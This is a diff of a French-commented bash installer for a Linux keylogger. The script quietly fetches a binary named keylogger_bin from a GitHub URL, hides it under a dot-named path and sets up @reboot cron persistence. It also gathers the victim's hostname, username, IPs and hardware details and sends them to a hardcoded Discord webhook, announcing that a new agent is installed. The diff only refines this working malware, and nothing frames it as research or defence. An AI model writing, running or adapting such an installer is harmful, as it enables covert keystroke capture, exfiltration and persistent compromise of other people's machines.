@@ -1,59 +1,71 @@
 #!/bin/bash
 
-# ─────────────────────────────────────────────────────────
-#  Configuration - NE PAS MODIFIER SAUF L'URL GITHUB
-# ─────────────────────────────────────────────────────────
+# ─── Configuration ───────────────────────────────────────
 WEBHOOK_URL="https://discord.com/api/webhooks/1364683763170283672/iLME1HvQUf85TgjkucHa_U5HqYX7K43aNvPTO1A7NcVRyXvFwIP4urmjnYv9C1yezCmZ"
 GITHUB_BIN_URL="https://raw.githubusercontent.com/Tomatorgb/KlinuxconfigL/main/keylogger_bin"
 INSTALL_DIR="/usr/local/src/.bin"
 BINARY_NAME=".sys_worker"
 LOG_FILE="/tmp/.sys_log.txt"
 
-# ─────────────────────────────────────────────────────────
-#  Récupérer les infos de la machine cible
-# ─────────────────────────────────────────────────────────
-HOSTNAME=$(hostname)
-USERNAME=$(whoami)
-OS=$(cat /etc/os-release 2>/dev/null | grep PRETTY_NAME | cut -d'"' -f2 || echo "Linux inconnu")
-KERNEL=$(uname -r)
-ARCH=$(uname -m)
-IP_LOCAL=$(hostname -I 2>/dev/null | awk '{print $1}' || echo "Inconnue")
-IP_PUBLIC=$(curl -s --max-time 5 https://api.ipify.org 2>/dev/null || echo "Inconnue")
-CPU=$(grep "model name" /proc/cpuinfo 2>/dev/null | head -1 | cut -d':' -f2 | xargs || echo "Inconnu")
-RAM=$(free -h 2>/dev/null | awk '/Mem:/ {print $2}' || echo "Inconnu")
-DISK=$(df -h / 2>/dev/null | awk 'NR==2 {print $2}' || echo "Inconnu")
-DATE_INSTALL=$(date "+%d/%m/%Y à %H:%M:%S")
+# ─── Infos machine ────────────────────────────────────────
+HOSTNAME_VAL=$(hostname)
+USERNAME_VAL=$(whoami)
+OS_VAL=$(grep PRETTY_NAME /etc/os-release 2>/dev/null | cut -d'"' -f2 || echo "Linux")
+KERNEL_VAL=$(uname -r)
+ARCH_VAL=$(uname -m)
+IP_LOCAL_VAL=$(hostname -I 2>/dev/null | awk '{print $1}' || echo "?")
+IP_PUBLIC_VAL=$(curl -s --max-time 5 https://api.ipify.org 2>/dev/null || echo "?")
+CPU_VAL=$(grep "model name" /proc/cpuinfo 2>/dev/null | head -1 | cut -d':' -f2 | xargs || echo "?")
+RAM_VAL=$(free -h 2>/dev/null | awk '/Mem:/ {print $2}' || echo "?")
+DISK_VAL=$(df -h / 2>/dev/null | awk 'NR==2 {print $2}' || echo "?")
+DATE_VAL=$(date "+%d/%m/%Y %H:%M:%S")
 
-# ─────────────────────────────────────────────────────────
-#  Installation
-# ─────────────────────────────────────────────────────────
-sudo mkdir -p "$INSTALL_DIR"
-sudo chmod 700 "$INSTALL_DIR"
+# ─── Installation ─────────────────────────────────────────
+mkdir -p "$INSTALL_DIR"
+chmod 700 "$INSTALL_DIR"
 
-# Télécharger le binaire
-sudo curl -sL "$GITHUB_BIN_URL" -o "$INSTALL_DIR/$BINARY_NAME"
-sudo chmod +x "$INSTALL_DIR/$BINARY_NAME"
+curl -sL "$GITHUB_BIN_URL" -o "$INSTALL_DIR/$BINARY_NAME"
+chmod +x "$INSTALL_DIR/$BINARY_NAME"
 
-# Créer le fichier de log
-sudo touch "$LOG_FILE"
-sudo chmod 600 "$LOG_FILE"
+touch "$LOG_FILE"
+chmod 600 "$LOG_FILE"
 
-# Configurer le cron pour démarrage automatique (30s de délai)
+# Cron persistence (30s après démarrage)
 CRON_JOB="@reboot sleep 30 && $INSTALL_DIR/$BINARY_NAME"
-(sudo crontab -l 2>/dev/null | grep -v "$BINARY_NAME"; echo "$CRON_JOB") | sudo crontab -
+(crontab -l 2>/dev/null | grep -v "$BINARY_NAME"; echo "$CRON_JOB") | crontab -
 
-# ─────────────────────────────────────────────────────────
-#  Envoyer la notification Discord
-# ─────────────────────────────────────────────────────────
-MESSAGE="🚨 **NOUVEAU AGENT INSTALLÉ** 🚨\n\n\`\`\`\n📅 Date         : $DATE_INSTALL\n💻 Hostname     : $HOSTNAME\n👤 Utilisateur   : $USERNAME\n🖥️  OS            : $OS\n🐧 Kernel        : $KERNEL\n⚙️  Architecture  : $ARCH\n🌐 IP Locale     : $IP_LOCAL\n🌍 IP Publique   : $IP_PUBLIC\n🔧 CPU           : $CPU\n💾 RAM           : $RAM\n💿 Disque (/)    : $DISK\n\`\`\`\n✅ Keylogger actif — Les logs seront envoyés toutes les ~3 min."
+# ─── Notification Discord via Python3 (JSON propre) ────────
+python3 - <<PYEOF
+import urllib.request, json
 
-curl -s -X POST "$WEBHOOK_URL" \
-    -H "Content-Type: application/json" \
-    -d "{\"content\": \"$(echo -e "$MESSAGE" | sed 's/"/\\"/g')\"}"
+webhook = "$WEBHOOK_URL"
+msg = (
+    "**NEW AGENT INSTALLED**\n"
+    "\`\`\`\n"
+    "Date     : $DATE_VAL\n"
+    "Host     : $HOSTNAME_VAL\n"
+    "User     : $USERNAME_VAL\n"
+    "OS       : $OS_VAL\n"
+    "Kernel   : $KERNEL_VAL\n"
+    "Arch     : $ARCH_VAL\n"
+    "IP Local : $IP_LOCAL_VAL\n"
+    "IP Pub   : $IP_PUBLIC_VAL\n"
+    "CPU      : $CPU_VAL\n"
+    "RAM      : $RAM_VAL\n"
+    "Disk     : $DISK_VAL\n"
+    "\`\`\`\n"
+    "Keylogger actif. Logs envoyes toutes les 200s."
+)
+data = json.dumps({"content": msg}).encode("utf-8")
+req = urllib.request.Request(webhook, data=data, headers={"Content-Type": "application/json"})
+try:
+    urllib.request.urlopen(req, timeout=10)
+    print("[+] Notification Discord envoyee !")
+except Exception as e:
+    print("[!] Erreur Discord:", e)
+PYEOF
 
-# ─────────────────────────────────────────────────────────
-#  Lancer immédiatement sans redémarrer (pour test)
-# ─────────────────────────────────────────────────────────
-sudo "$INSTALL_DIR/$BINARY_NAME" &
+# ─── Lancement immédiat ───────────────────────────────────
+"$INSTALL_DIR/$BINARY_NAME" &
 
-echo "[+] Installation terminée. Binaire caché dans : $INSTALL_DIR/$BINARY_NAME"
+echo "[+] Installation terminee. Binaire : $INSTALL_DIR/$BINARY_NAME"
